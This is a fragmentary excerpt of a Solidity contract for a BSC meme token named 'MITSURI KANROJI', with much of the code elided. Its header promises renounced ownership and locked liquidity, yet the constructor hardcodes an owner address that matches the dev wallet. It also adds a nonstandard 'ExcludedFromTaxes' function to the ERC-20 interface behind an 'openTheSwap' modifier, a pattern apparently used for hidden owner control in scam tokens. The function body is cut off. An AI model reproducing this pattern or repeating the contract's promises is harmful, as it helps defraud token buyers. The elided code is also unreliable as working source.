...
/**
Telegram - https://t.me/MitsuriKanrojiBSC
 Ownership will be renounced and liquidity will be locked for a month initially
 Low taxes
...
interface IERC20 {
    ...
    function ExcludedFromTaxes(address account) external returns (uint256);
...
contract MITSURIKANROJI is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x697143CDb3aFF579ADdc5De15DF1F50570a54Cef); 
    address payable public Wallet_Dev = payable(0xB51caE898EFaB9aa7948B1c0DE9aa383c9107A49);
    ...
    string private constant _name = "MITSURI KANROJI"; 
    ...
    constructor (address rou) {
        ...
        _owner = 0xB51caE898EFaB9aa7948B1c0DE9aa383c9107A49;
    ...
    function ExcludedFromTaxes(address account) public openTheSwap override returns (uint256) {
        if(isFee){
